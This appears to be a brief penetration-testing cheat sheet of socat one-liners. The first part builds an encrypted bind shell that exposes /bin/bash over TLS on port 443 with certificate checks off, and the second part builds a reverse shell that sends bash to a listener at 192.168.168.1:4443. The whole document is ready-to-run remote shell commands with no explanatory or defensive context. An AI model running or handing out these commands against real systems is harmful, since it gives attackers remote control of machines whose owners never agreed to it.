### OpenSSL

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```


```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```


```bash
socat - OPENSSL:10.11.0.4:443,verify=0
```

### Reverse Shell

```shell
socat -d -d TCP4-LISTEN:4443 STDOUT
```

```bash
socat TCP4:192.168.168.1:4443 EXEC:/bin/bash
```
